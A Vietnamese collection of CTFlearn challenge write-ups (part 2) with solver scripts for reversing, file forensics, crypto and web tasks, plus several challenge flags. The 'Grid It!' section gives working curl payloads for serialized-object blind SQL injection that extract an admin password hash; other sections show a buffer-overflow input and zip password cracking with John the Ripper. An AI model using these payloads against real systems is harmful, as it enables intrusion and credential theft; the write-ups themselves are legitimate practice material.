
# CTF challenges and solutions (part 2)

## Riyadh
- Khá giống với 1 bài đã từng làm là Reykjavik nhưng mà phức tạp hơn.
- Cần debug từng bước một và đọc code cùng kiểm tra các giá trị của hàm.
- Đầu tiên cứ chạy file thì ta sẽ biết được cần chạy file với input là flag: `Usage: Riyadh flag`.
- Ròi giờ thử với 
    ```
    ./Riyadh hehe                          
    Welcome to CTFlearn Riyadh Reversing Challenge!
    Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse
    You entered the wrong flag :-(

    ```
- Tới đây thì chắc hẳn sẽ phải mở gdb lên rồi. À mà trước đó nhớ đọc code dạng asm nhé hoặc decomplie gì gì đó để hiểu đoạn dưới.
- Đầu tiên đặt breakpoint tại main+0x49. Tức là từ đoạn kiểm tra input.
- Tiếp đó chạy từng dòng trên gdb để kiểm tra các giá trị thì thấy có 1 đoạn so sánh như này: `0x555555555160 <main+0060>      call   0x5555555550e0 <strcmp@plt>`và đọc kĩ thì sẽ biết được giá trị input sẽ được so sánh với `"CTFlearn{Reversing_Is_Easy}"` vậy ta thử thêm flag này xem sao: 

    ```
    run 'CTFlearn{Reversing_Is_Easy}'
    ```
- Ok và sau đó ta đã nhận được 1 cú lừa :),
- Rồi thì đọc kĩ code thì ta cần nhảy qua đoạn cú lừa này ok giờ run lại với input cũ và tới bước kiểm tra ta sẽ set thanh ghi `rdi = 0x00007fffffffe19c`.
- Để giải thích đoạn trên thì khi chạy bdg tới dòng main+60 thì sẽ cho ta biết là hàm strcmp sẽ so sánh 2 giá trị ở 2 thanh ghi rsi và rdi với giá trị trong rdi chính là cái mà mình set cho rsi. Vậy ta có thể giữ nguyên input cũ mà vẫn có thể nhảy qua cái đoạn cú lừa này :). À mà theo code thì phải thỏa mãn việc 2 thanh ghi bằng nhau thì mới chạy tiếp được.
    ```
    (gdb) set $rdi = 0x00007fffffffe19c
    ```
- Ok tiếp với input hehe thì chạy hoài vẫn bị in ra sai flag vậy ta quay lại với code. 
- Chú ý ở dòng main+75 có so sánh RAX với 0x1e và đọc ở decomplie nghĩa là độ dài xâu nào đó và trong trường hợp này sẽ so sánh với độ dài lấy từ thanh ghi rdi vậy nên ta cần sửa rdi chứ không phải rsi như trên.
    ```
        (gdb) run 'hehehehehehehehehehehehehehehe'
    ```
- Và sau một hồi chạy chạy ta có được 1 flag là `CTFlearn{Masmak_Fortress_1865}` đem chạy thử thì ok chính xác luôn.
    ```
    ./Riyadh CTFlearn{Masmak_Fortress_1865}
    Welcome to CTFlearn Riyadh Reversing Challenge!
    Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse

    CONGRATULATIONS!! You found the flag:  CTFlearn{Masmak_Fortress_1865}

    All Done!

    ```
![Riyadh1](https://github.com/LongPhamplus/CTF-Learn-Writeup/blob/master/Part2_pic/Riyadh1.png)

## Time to Eat
- Đọc code để hiểu và tìm ra flag
<details>
	<summary>Đoạn mã chuyển đổi cho dễ đọc để tham khảo</summary>
	
	toInt = int
	sizeOfString = len
	toString = str
	checkCharNotNum = toString.isdigit # kiem tra xem xau co chua ki tu khac so hay khong
	
	def Eating(eat):
	    return toString(toInt(eat)*roundLen3) #chuyen so eat thanh so roi nhan voi roundLen3 roi chuyen ket qua thanh string
	
	def EAt(eat, eats):
	    print(eat, eats)
	    eat1 = 0
	    eat2 = 0
	    i = 0
	    eAt = ""
	    while eat1 < sizeOfString(eat) and eat2 < sizeOfString(eats):
		if i%roundLen3 == roundLen3Sub1//roundLen3Plus1: # i%3 == 0:
		    eAt += eats[eat2]
		    eat2 += 1
		else:
		    eAt += eat[eat1]
		    eat1 += 1
		i += 1
	    return eAt
	
	def reverse(eat):
	    return eat[::roundLen3-roundLen3Plus1]  # cat xau voi buoc nhay -1 hay co the hieu la dao xau
	
	def eaT(eat):
	    return Eating(eat[:roundLen3]) + reverse(eat) # Eating(eat[:3]) + reverse(eat)
	
	def aTE(eat):
	    return eat
		# Lap lai xau sizeOfString(eat) lan
	def Ate(eat):
	    return "Eat" + toString(sizeOfString(eat)) + eat[:roundLen3] # "Eat" + toString(9) + eat[:3]
	
	def Eat(eat):
	    if sizeOfString(eat) == 9: #checkCharNotNum(eat[:3]) 
		if checkCharNotNum(eat[:roundLen3]) and\
		    checkCharNotNum(eat[sizeOfString(eat)-roundLen3+1:]): # checkCharNotNum(eat[7:])
			eateat = EAt(eaT(eat), Ate(aTE(reverse(eat))))
			if eateat == "E10a23t9090t9ae0140":
			    flag = "eaten_" + eat
			    print("absolutely EATEN!!! CTFlearn{",flag,"}")
			else:
			    print("thats not the answer. you formatted it fine tho, here's what you got\n>>", eateat)
		else:
		    print("thats not the answer. bad format :(\
		    \n(hint: 123abc456 is an example of good format)")
	    else:
		print("thats not the answer. bad length :(")
	
	print("what's the answer")
	eat = input()
	roundLen3 = sizeOfString(eat)//3 	# Lay kich thuoc string roi chia 3 lay phan nguyen
	roundLen3Plus1 = roundLen3+1
	roundLen3Sub1 = roundLen3-1
	Eat(eat)
 </details>


## Music To My Ears
- File tải về khi mở lên thì sẽ bị lỗi là không mở được. Thường những trường hợp như này thì ta sẽ xem xét phần header của file là biết ngay.
- Rồi phần header khi mở sẽ trông nhử này: `filetypeM4A`
- Thì đúng ra file m4a sẽ cần có header như này: `ftypM4A` hay dạng hex sẽ là `00 00 00 18 66 74 79 70 4D 34 41 20 00 00 20 00`.
- Đó chỉ cần sửa lại thì file sẽ chạy được thôi. Lưu ý là cần bỏ 4 byte đầu tiên ở dòng 2 tức là khoảng trắng sau phần `M4A`.


## Python Reversal
- Cố gắng đọc code để hiểu hoặc dùng đoạn mã tham khảo dưới:
<details>
	<summary>Đoạn mã tham khảo (Python)</summary>
	
	import base64
	import base64 as rtfd
	import webbrowser
	import time
	import itertools
	
	
	def dePromt(input):
	    return input.decode('utf-8')
	def decodemikeSwift(encoded):
	    i = 0
	    decode = ""
	    while i < len(encoded):
	        decode += encoded[i]
	        i += 7
	    return decode
	def decodeCrypt(encrypt):
	    i = len(encrypt) - 1
	    decrypt = ""
	    count = 0
	    while i >= 3:
	        count_to_string = str(count)
	        check = ""
	        while True:
	            check = encrypt[i] + check
	            if check == count_to_string:
	                break
	            else:
	                i -= 1
	        decrypt += encrypt[i-1]
	        i -= 2
	        count += 1
	    return decrypt
	def deObfuscate(enObjuscate):
	    fusc="florSFIUEfet4565477"
	    tt = "534345fdfgfgfdhty6y56yjl"
	    i = len(fusc)
	    decode = ""
	    while i < len(enObjuscate) - len(tt):
	        decode += enObjuscate[i]
	        i += 1
	    encode_string = decode
	    decoded_bytes = base64.b64decode(encode_string)
	    decoded_string = decoded_bytes.decode('utf-8')
	    return decoded_string
	def mikeSwift(cre):
	    sto = []
	    gre = ""
	    for i in cre:
	        sto.append(i+str(len(i)))
	        sto.append("h4ck" + i)
	    for i in sto:
	        gre+=i
	    return gre
	
	
	encodeString = "81h4ck891h4ck931h4ck3l1h4ckl81h4ck821h4ck2j1h4ckj81h4ck811h4ck1y1h4cky81h4ck801h4ck061h4ck671h4ck791h4ck951h4ck571h4ck781h4ck8y1h4cky71h4ck771h4ck761h4ck671h4ck761h4ck6y1h4cky71h4ck751h4ck5t1h4ckt71h4ck741h4ck4h1h4ckh71h4ck731h4ck3d1h4ckd71h4ck721h4ck2f1h4ckf71h4ck711h4ck1g1h4ckg71h4ck701h4ck0f1h4ckf61h4ck691h4ck9g1h4ckg61h4ck681h4ck8f1h4ckf61h4ck671h4ck7d1h4ckd61h4ck661h4ck6f1h4ckf61h4ck651h4ck551h4ck561h4ck641h4ck441h4ck461h4ck631h4ck331h4ck361h4ck621h4ck241h4ck461h4ck611h4ck131h4ck361h4ck601h4ck051h4ck551h4ck591h4ck9=1h4ck=51h4ck581h4ck801h4ck051h4ck571h4ck7n1h4ckn51h4ck561h4ck6R1h4ckR51h4ck551h4ck5s1h4cks51h4ck541h4ck4R1h4ckR51h4ck531h4ck3z1h4ckz51h4ck521h4ck2Z1h4ckZ51h4ck511h4ck1f1h4ckf51h4ck501h4ck0V1h4ckV41h4ck491h4ck9T1h4ckT41h4ck481h4ck8M1h4ckM41h4ck471h4ck7f1h4ckf41h4ck461h4ck6N1h4ckN41h4ck451h4ck5H1h4ckH41h4ck441h4ck4Z1h4ckZ41h4ck431h4ck3y1h4cky41h4ck421h4ck2R1h4ckR41h4ck411h4ck1z1h4ckz41h4ck401h4ck0d1h4ckd31h4ck391h4ck9r1h4ckr31h4ck381h4ck8N1h4ckN31h4ck371h4ck7G1h4ckG31h4ck361h4ck6N1h4ckN31h4ck351h4ck5i1h4cki31h4ck341h4ck491h4ck931h4ck331h4ck311h4ck131h4ck321h4ck2Z1h4ckZ31h4ck311h4ck101h4ck031h4ck301h4ck0w1h4ckw21h4ck291h4ck9m1h4ckm21h4ck281h4ck8R1h4ckR21h4ck271h4ck771h4ck721h4ck261h4ck6J1h4ckJ21h4ck251h4ck5X1h4ckX21h4ck241h4ck4Z1h4ckZ21h4ck231h4ck3i1h4cki21h4ck221h4ck2l1h4ckl21h4ck211h4ck131h4ck321h4ck201h4ck0Y1h4ckY11h4ck191h4ck971h4ck711h4ck181h4ck871h4ck711h4ck171h4ck741h4ck411h4ck161h4ck651h4ck511h4ck151h4ck561h4ck611h4ck141h4ck451h4ck511h4ck131h4ck341h4ck411h4ck121h4ck2t1h4ckt11h4ck111h4ck1e1h4cke11h4ck101h4ck0f1h4ckf91h4ck9E1h4ckE81h4ck8U1h4ckU71h4ck7I1h4ckI61h4ck6F1h4ckF51h4ck5S1h4ckS41h4ck4r1h4ckr31h4ck3o1h4cko21h4ck2l1h4ckl11h4ck1f1h4ckf01h4ck0"
	encodeString = decodemikeSwift(encodeString)
	encodeString = decodeCrypt(encodeString)
	encodeString = deObfuscate(encodeString)
	print(encodeString)
</details>


## Weird Android Calculator
- Đã từng có 1 bài kiểu này ròi và khá là đơn giản :)).
- Đầu tiên thì tải file về nếu bạn muốn tải về bằng điện thoại ròi chạy cũng được :)) mình cũng chưa có thử còn ở đây ta sẽ cho vào 1 cái decompiler để xem mã nguồn.
- Chú ý thì ở trong đường dẫn `WeirdCalculator.apk sources de vidar weirdcalculator Parser.java` ta sẽ thấy được 1 dòng khá đáng ngờ là
  ```
  if (v > 100.0d) {
	for (int i : new int[]{1407, 1397, 1400, 1406, 1346, 1400, 1385, 1394, 1382, 1293, 1367, 1368, 1365, 1344, 1354, 1288, 1354, 1382, 1288, 1354, 1382, 1355, 1293, 1357, 1361, 1290, 1355, 1382, 1290, 1368, 1354, 1344, 1382, 1288, 1354, 1367, 1357, 1382, 1288, 1357, 1348}) {
	    Log.d("OUTPUT", Integer.toString(i ^ 1337));
	}
  }
  return v;
  ```
- Lấy dữ liệu đem đi xor thì ta sẽ ra được flag.
  <details>
	  <summary>Đoạn mã tham khảo (python)</summary>

	  a = [1407, 1397, 1400, 1406, 1346, 1400, 1385, 1394, 1382, 1293, 1367, 1368, 1365, 1344, 1354, 1288, 1354, 1382, 1288, 1354, 1382, 1355, 1293, 1357, 1361, 1290, 1355, 1382, 1290, 1368, 1354, 1344, 1382, 1288, 1354, 1367, 1357, 1382, 1288, 1357, 1348]
	  for i in a:
  		print(chr(i ^ 1337), end='')
  
  </details>


## Brute Force is Fun!
- Ở bài này thì khi tải file về sẽ là 1 cái ảnh mà đề gợi ý là brute force thì chắc flag sẽ ko phải nằm trên bức ảnh rồi.
- Đầu tiên ta sẽ thử binwalk ra thì thấy tùm lum file :)) chả đâu vào đâu nhưng khi unzip file `1926.zip` thì lại yêu cầu mật khẩu vậy là brute force ở đây rồi.
- Ta sẽ sử dụng JohnTheRipper để bruteforce cái này.
- Đầu tiên thì cần tạo 1 wordlist đã. Để có được wordlist này thì ta cần tìm bên trong folder có tên là `folders` thì trong đường dẫn `_legotroopers.jpg.extracted/folders/73/43/` và `_legotroopers.jpg.extracted/folders/73/47/` sẽ chứa 1 file tên là p và có nội dung là:
	```
 	Hmmm... almost!
	The password is: "ctflag*****" where * is a number.
	Encrypt the password using MD5 and compare it to the given hash!
	As I said, you're gonna have to brute force the password!
	Good luck! :)
 	```
- Đó và ta sẽ có được wordlist dạng ctflag*****. Có thể dùng đoạn mã dưới đây để tạo:
<details>
	<summary>Đây là đoạn mã tham khảo (python)</summary>

 	import itertools

	def save_ctflag_to_file(filename):
	    digits = '0123456789'
	    combinations = itertools.product(digits, repeat=5)
	    
	    with open(filename, 'w') as f:
	        for combo in combinations:
	            f.write('ctflag' + ''.join(combo) + '\n')
	
	# Lưu vào file ctflags.txt
	save_ctflag_to_file('ctflags.txt')

</details>

- Gòi có wordlist thì sẽ dùng john thôi: `zip2john 1926.zip > hash ` và rồi `john hash --wordlist=ctflags.txt` đó và ta sẽ có pass chính là `ctflag48625` dùng pass này để unzip 1926.zip thì ta sẽ có 1 file flag và base64 nội dung file là có flag.

## Is it the Flag? (JAVA)
- Bài này chỉ có mỗi cách là brute force thôi chứ chả còn cách nào :)) nhưng mà phải suy luận sao cho bruteforce hợp lý nhất.
<details>
	<summary>Đây là đoạn mã tham khảo (python)</summary>
	
	import sys
	
	def java_string_hashcode(s): # The hashCode function in java.
	    h = 0
	    for c in s:
	        h = (31 * h + ord(c)) & 0xFFFFFFFF
	    return ((h + 0x80000000) & 0xFFFFFFFF) - 0x80000000
	
	def isFlag(str):
	        return java_string_hashcode(str) == 1471587914 and java_string_hashcode(str.lower) == 1472541258 # The function from the CTF.
	
	def main():
	   sum=0
	   max1 = pow(31, 4) * 122 # Max option of alphanumeric characters.
	   min1 = pow(31, 4) * 48  # Min option of alphanumeric characters.
	   max2 = pow(31, 3) * 122
	   min2 = pow(31, 3) * 48
	   max3 = pow(31, 2) * 122
	   min3 = pow(31, 2) * 48
	   max4 = pow(31, 1) * 122
	   min4 = pow(31, 1) * 48
	   max5 = 122
	   min5 = 48
	   list=[]                  # Make a list of alphanumeric characters.
	   for i in range (48,58):
	       list.append(i)
	   for i in range (65,91):
	       list.append(i)
	   for i in range(97, 123):
	       list.append(i)
	
	   for i0 in list:
	       x0 = pow(31, 5) * i0
	       if (x0 + max1 + max2 + max3 + max4 + max5 >= 1471587914 and x0 + min1 + min2 + min3 + min4 + min5 <= 1472541258):

	           for i1 in list:
	               x1 = pow(31, 4) * i1
	               if (x0 + x1 + max2 + max3 + max4 + max5 >= 1471587914 and x0 + x1 + min2 + min3 + min4 + min5 <= 1472541258):

	                   for i2 in list:
	                       x2 = pow(31, 3) * i2
	                       if (x0 + x1 + x2 + max3 + max4 + max5 >= 1471587914 and x0 + x1 + x2 + min3 + min4 + min5 <= 1472541258):

	                           for i3 in list:
	                               x3 = pow(31, 2) * i3
	                               if (x0 + x1 + x2 + x3 + max4 + max5 >= 1471587914 and x0 + x1 + x2 + x3 + min4 + min5 <= 1472541258):

	                                   for i4 in list:
	                                       x4 = pow(31, 1) * i4
	                                       if (x0 + x1 + x2 + x3 + x4 + max5 >= 1471587914 and x0 + x1 + x2 + x3 + x4 + min5 <= 1472541258):
	
	                                           for i5 in list:
	                                               x5 = i5
	                                               if (x0 + x1 + x2 + x3 + x4 + x5 == 1471587914 ):
	                                                       flag = ""
	                                                       flag += chr(i0) + chr(i1) + chr(i2) + chr(i3) + chr(i4) + chr(i5)
	                                                       if(java_string_hashcode(flag.lower())==1472541258):  # Check for the lowercase condition.
	                                                           print("The flag is:", flag)
	                                                           sys.exit()
	main()
</details>

## The Keymaker
- Sau khi tải ảnh về và strings ta sẽ nhận được 1 đoạn kí tự khá là lạ đó là:
  ```
	b3BlbnNzbCBlbmMgLWQgLWFlcy0yNTYtY2JjIC1pdiBTT0YwIC1LIFNPUyAtaW4gZmxhZy5lbmMg
	LW91dCBmbGFnIC1iYXNlNjQKCml2IGRvZXMgbm90IGluY2x1ZGUgdGhlIG1hcmtlciBvciBsZW5n
	dGggb2YgU09GMAoKa2V5IGRvZXMgbm90IGluY2x1ZGUgdGhlIFMwUyBtYXJrZXIKCg==
	CmmtaSHhAsK9pLMepyFDl37UTXQT0CMltZk7+4Kaa1svo5vqb6JuczUqQGFJYiycY
  ```
- Để ý 3 dòng trên kết thúc bởi == thì ta biết được sẽ phải dùng base64 ròi và decode ra ta có cái này:
  ```
  openssl enc -d -aes-256-cbc -iv SOF0 -K SOS -in flag.enc -out flag -base64

  iv does not include the marker or length of SOF0

  key does not include the S0S marker

  ```
- Ok giờ thì đơn giản hơn rồi chỉ cần dùng đoạn mã trên thôi với flag.enc có nội dung là dòng tứu 4 của phần trả về sau khi strings.
- Nhưng cần phải biết iv và key là gì đã. Trong hệ mât aes-256-cbc thì iv sẽ có độ dài là 128 bit hay 16 bytes và key sẽ là 256 bits hay 32 btyes. Mở hexeditor của bạn lên tìm 2 phần bắt đầu của SOS và SOF0, có thể dùng imhex cho dễ hoặc 1 cái tool nào đó và cần biết về jpeg format nhé.
- Có các giá trị iv và key thì có thể tạo 2 file iv và key và dùng lệnh:
 ```
 openssl enc -d -aes-256-cbc -iv $(cat iv) -K $(cat key) -in flag.enc -out flag -base64
 ```
- Flag sẽ được ghi vào bên trong file flag.

## Grid It!
#### Quan sát vấn đề

- Trước mắt là thấy trang web sẽ gửi dữ liệu theo method post với các giao thức là `register`, `login`, `add_point`, `delete_point`.
- Với `add_point` sẽ gửi dữ liệu qua `https://web.ctflearn.com/grid/controller.php?action=add_point` với data là `x=a&y=b`.
- Với `delete_point` sẽ gửi qua `https://web.ctflearn.com/grid/controller.php?action=delete_point&` với tham số `point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544";}`.

#### Ok vào vấn đề chính.
- Đầu tiên là đăng kí và đăng nhập cái đã.
- Với `add_point` sau khi mình thử nhiều lần thì không có công dụng gì lắm chủ yếu chỉ là ở phần `delete_point` thôi.
- Giờ ta sẽ thử gửi 1 request về máy chủ với lệnh 
```
    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=add_point" --data "x=1&y=1"
```
- Với giá trị ____ là PHPSESSID của bạn. 
- Từ đó thì ta có thể thấy được trên trang web đã add thêm 1 nút cho chúng ta.
- Rồi giờ thử gửi 1 lệnh xóa xem như nào:
```
    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544";}"
```
- Và ok đã xóa thành công. Giờ hãy thử add thêm thật nhiều nút để thử SQL Injection xem sao. (Tự add nhé :Đ ).
- Giờ sẽ dùng lệnh 
```
    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544 or 1";}"
```
- Và well ta đã thành công xóa tất cả các nút với câu lệnh trên và đây chính là nơi để tận dụng cái inject này.
- Do không có các nào để lấy được hay hiển thị dữ liệu để mình có thể nhìn thấy được nên trong trường hợp này ta sẽ sử dụng 1 kỹ thuật là Blind SQL Injection.
- Dựa trên những gì ta đã có thì câu lệnh delete của trang web sẽ có dạng DELELTE FROM ... WHERE ID = ____ và ta sẽ thêm vào phần id giá trị như sau:
```
    curl --cookie "PHPSESSID=____"\
    "https://web.ctflearn.com/grid/controller.php?action=delete_point"\
    --data-urlencode 'point=O:5:"point":3:{s:1:"x";s:3:"123";s:1:"y";s:3:"123";s:2:"ID";s:182:"3623781 AND IF(Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1),1,1))>97, BENCHMARK(50000000, ENCODE("test","key")), NULL)";}' --get
```
- Đoạn mã trên đại loại sẽ lấy giá trị đầu tiên trong các tên bảng và kiểm tra kí tự đầu tiên của tên đó nếu đúng thì sẽ delay khá lâu và nếu sai thì sẽ không có sự delay nào ở đây cả. Và từ đó là ta đã đi vào Blind SQL Injection rồi :D.
- Giờ thì chỉ cần dùng tìm kiếm nhị phân tìm ra tên bảng rồi sau đó thay đổi câu lệnh sql tìm ra cột trong bảng và các giá trị có trong bảng thôi.
- Vì tới thời điểm hiện tại bài đã được tải lên khá lâu rồi nên DB sẽ có nhiều dữ liệu rác nên có thể công cuộc tìm kiếm sẽ khá là khó vậy nên có thể gợi ý cho bạn là sẽ có 2 bảng chính là user và point, bảng user sẽ có username và password. Lần ra password qua username là admin và sẽ có 1 mã hash bằng md5. Dùng 1 tool để decrypt mã hash ra là sẽ có pass của admin, đăng nhập vào là sẽ được flag. (nội dung flag chả liên quan gì tới bài ._. ).


## Blackbox
- Sau khi chạy câu lệnh thì ta sẽ được điều khiển 1 máy ảo và quyền siêu hạn chế. Việc duy nhất có thể làm đó là chạy file blackbox . hết.
- Ok với câu hỏi 1 + 1 bằng mấy thì ai chả biết bằng 2 nhưng mà nhập số mấy thì nó vẫn ra là `No dummy... 1 + 1 != 0...` clm.
- Ròi giờ ta sẽ thử thêm một giá trị siêu siêu lớn để tràn kiểu long long hay int xem như nào ví dụ như là '99999999999999999999999999999999999999999999999999999999999'. Hmmmmm cũng không được vậy thử in ra 1 chuỗi kí tự siêu lớn xem tại có thể đoạn mã ko lưu input là 1 số rồi. Có thể nhập tay hoặc dùng python nhé:
```
    python3 -c 'print("A"*99 + chr(0x02))' | ./blackbox
```
- Ố ồ ta có gì đây lỗi bufer overflow :
```
    blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print("A"*99 + chr(0x02))' | ./blackbox
    What is 1 + 1 = No dummy... 1 + 1 != 1094795585...
    *** stack smashing detected ***: <unknown> terminated

    [10]+  Stopped                 python3 -c 'print("A"*99 + chr(0x02))' | ./blackbox

```
- Ngon giờ có 1 gợi ý là input sẽ có dạng là `input[n]` với n là số kí tự được cho sẵn. Sau khi thử vài lần thì với giá trị n = 80 sẽ không bị tràn nữa.
- Nhưng khi thay n = 81, 82, 83 thì lại ra các giá trị tương ứng là 65, 16705, 4276545. Chú ý thì đây chính là giá trị hex chuyển qua dec của 0xA, 0xAA, 0xAAA và ở đó sẽ lưu lại cái đáp án của mình. Tức là cái giá trị bị overflow sẽ là chỗ mà mình cần ghi câu trả lời.
- Chỉ cần dùng đoạn mã dưới đây là xong:
```
    python3 -c 'print("A"*80 + chr(0x02))' | ./blackbox
```

## Bite-code
- Với bài này thì điều đầu tiên cần làm là đọc hiểu code đã.
- Giải thích sương sương thì đoạn mã chính sẽ là như này:
```
	0: iload_0     // Đẩy giá trị của tham số input (biến số 0) lên stack.
	1: iconst_3    // Đẩy hằng số 3 lên stack.
	2: ishl        // Dịch trái input 3 bit (tương đương nhân input với 2^3 = 8).
	3: istore_1    // Lưu kết quả (input * 8) vào biến số 1.
	
	4: iload_0     // Đẩy lại giá trị của input lên stack.
	5: ldc #2      // Đẩy giá trị hằng 525024598 lên stack.
	7: ixor        // Thực hiện phép XOR giữa input và 525024598.
	8: istore_2    // Lưu kết quả XOR vào biến số 2.
	
	9:  iload_1    // Đẩy giá trị biến 1 (input * 8) lên stack.
	10: iload_2    // Đẩy giá trị biến 2 (kết quả XOR) lên stack.
	11: ixor       // Thực hiện phép XOR giữa biến 1 và biến 2.
	12: ldc #3     // Đẩy giá trị hằng -889275714 lên stack.
	14: if_icmpne 21 // Nếu giá trị kết quả XOR ở bước trên KHÁC -889275714, nhảy tới offset 21.
	17: iconst_1   // Đẩy giá trị `true` (1) lên stack.
	18: goto 22    // Nhảy tới offset 22 (kết thúc hàm).
	21: iconst_0   // Đẩy giá trị `false` (0) lên stack.
	22: ireturn    // Trả về giá trị boolean từ stack.
```
- Đại loại là sẽ có giá trị input và sẽ có 1 hàm so sánh (input << 3) ^ input ^ 525024598 == -889275714. Dùng đoạn mã java dưới đây để dễ dàng cho ra kết quả.
<details>
	<summary>Đoạn mã tham khảo (java)</summary>

 	public class Main {
	     public static boolean checkNum(int param) {
	        int var1 = param << 3;
	        int var2 = param ^ 525024598;
	        return (var1 ^ var2) == -889275714;
	    }
	
	    public static void main(String[] args) {
	        // Thử nghiệm với một phạm vi số nguyên
	        for (int i = Integer.MIN_VALUE; i < Integer.MAX_VALUE; i++) {
	            if (checkNum(i)) {
	                System.out.println("Tìm thấy số thỏa mãn: " + i);
	                break;
	            }
	        }
	    }
	}
</details>

## Bobby Toe's iPad
- Sau khi tải file về thì strings ra chẳng có gì đặc biệt cả có chăng thì là dòng `congrats you found me! you win an iPad!` không có ý nghĩa gì cho lắm.
- Thử dùng các các lấy lại dữ liệu kiểu foremost nhưng cũng không ra gì cả. Có khả năng cao là key ở ngay trong ảnh rồi.
- Sử dụng một số công cụ thì ta có được key như sau: `zpv_tigqylhbafmeoesllpms`.
![BobbyToesIpad1](https://github.com/LongPhamplus/CTF-Learn-Writeup/blob/master/Part2_pic/BobbyToesIpad1.png)
- Ròi giờ hết manh mối rồi ta sẽ phải đi kiểm tra lại code xem như nào. Dùng 1 vài công cụ để mở hexeditor lên thì thấy sau đoạn `congrats you found me! you win an iPad!` thì ta có 1 đoạn hex là `4A 46 49 46` thì đây chính là phần header của 1 file jpeg ta sẽ thử lấy đoạn hex từ đây xuống xem sao. À mà format của 1 file jpeg sẽ có 6 byte đầu là `FF D8 FF E0 00 10` rồi mới tới 4 byte kia tức là thêm 6 byte này vào đầu.
- Ok giờ ta có 1 ảnh:
- ![BobbyToesIpad2](https://github.com/LongPhamplus/CTF-Learn-Writeup/blob/master/Part2_pic/BobbyToesIpad2.jpg)
- Lấy xâu bên trong ảnh xor với key bên trên là ra flag.

## Old memories
- unip xor 2 ảnh là xong.

## The Safest Encryption
- Với file zip ban đầu ta sẽ có thể có 2 file 1 file pdf và 1 file text. Mình biết rõ là file pdf bị lỗi rồi nhưng mà không tài nào sửa lại được vậy thì thử nhìn qua file txt.
- Kiểm tra qua lại thì thấy được là 2 file này có cùng kích thước vậy khả năng cao là phải ghép 2 file này lại để tạo ra 1 file mới rồi.
- Có thể tham khảo đoạn mã dưới đây hoặc dùng bất kì công cụ nào có thể.
<details>
	<summary>Đoạn mã tham khảo (python)</summary>

	with open('CTFLearn.pdf', 'rb') as file1:
		content1 = file1.read()
	with open('CTFLearn.txt', 'rb') as file2:
		content2 = file2.read()
	
	hex_content1 = content1
	hex_content2 = content2
	file_len = len(hex_content2)
	
	xor_result = bytes(a ^ b for a, b in zip(hex_content1[:file_len], hex_content2[:file_len]))
	with open('output_file.pdf', 'wb') as out:
		out.write(xor_result)
	print(hex_content1 )

</details>

## Get Into Command Mission
- Mịa đọc cmt lừa vl.
- Ở bài này khi mà kiểm tra trong phần strings thì sẽ thấy được có 1 phân gợi ý `data:image/png;base64` tức là đoạn kí tự sau đó sẽ là 1 đoạn hex bị encode bởi base64 của 1 file png giờ chỉ cần decode từ base63 ra chuyển qua hex rồi render ảnh là xong.
  ![Get Into Command Mission1](https://github.com/LongPhamplus/CTF-Learn-Writeup/blob/master/Part2_pic/Get%20Into%20Command%20Mission1.png)

## The Adventures of Boris Ivanov Part 2
- Ghép ảnh vào hết là ra rồi chuyển hex thành text.
<details>
	<summary>Đoạn mã tham khảo (python)</summary>
	
	from PIL import Image
	import os
	
	# Đường dẫn tới thư mục chứa các ảnh
	image_folder = "./pic"  # Đổi thành đường dẫn thư mục chứa các ảnh của bạn
	
	# Lấy tất cả các file ảnh từ thư mục
	image_files = [f for f in os.listdir(image_folder) if f.endswith('.png') or f.endswith('.jpg')]
	
	# Kiểm tra số lượng ảnh có đúng không
	if len(image_files) == 0:
	    raise ValueError("No images found in the specified directory.")
	
	# Mở tất cả ảnh và tính toán tổng chiều cao (vì ảnh đã có cùng chiều rộng và chiều cao)
	images = [Image.open(os.path.join(image_folder, image_file)) for image_file in image_files]
	
	# Tổng chiều cao của tất cả các ảnh
	total_height = sum(img.height for img in images)
	width = images[0].width  # Vì tất cả ảnh có cùng chiều rộng
	
	# Tạo một ảnh mới với chiều rộng và chiều cao tổng hợp
	result_image = Image.new('RGB', (width, total_height))
	
	# Dán tất cả ảnh vào ảnh mới theo chiều dọc
	y_offset = 0
	for img in images:
	    result_image.paste(img, (0, y_offset))
	    y_offset += img.height
	
	# Lưu ảnh kết quả
	result_image.save("combined_image_vertical.png")
	result_image.show()

</details>
